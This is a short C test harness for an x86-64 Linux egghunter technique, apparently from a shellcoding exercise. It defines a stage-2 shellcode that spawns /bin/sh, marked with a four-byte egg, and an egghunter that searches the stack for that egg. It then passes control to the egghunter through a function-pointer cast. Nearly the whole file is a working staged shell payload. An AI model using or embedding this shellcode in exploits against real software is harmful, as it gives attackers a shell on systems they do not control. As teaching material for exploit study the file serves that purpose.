#include<stdio.h>
#include<string.h>

void main()
{
    printf("Assuming our stage 2 payload can be placed in the stack...\n");

    // stage2 shellcode that spawns a shell, prepended with the egg
    unsigned char stage2[] = \
    "\x93\x48\x93\x48" \
    "\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05"; 

    // egghunter and stage2 shellcode are separated with some garbage
    unsigned char garbage[] = "\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA";

    unsigned char egghunter[] = "\x48\x89\xe1\x48\x83\xc1\x14\x48\xff\xc1\x81\x39\x93\x48\x93\x48\x75\xf5\xff\xe1";


    printf("Egghunter: location=%p length=%ld\n", egghunter, strlen(egghunter));
	printf("Stage2 shellcode: location=%p length=%ld\n", stage2, strlen(stage2));

    printf("Passing execution to the egghunter code...\n");
	int (*ret)() = (int(*)())egghunter;
	ret();
}

	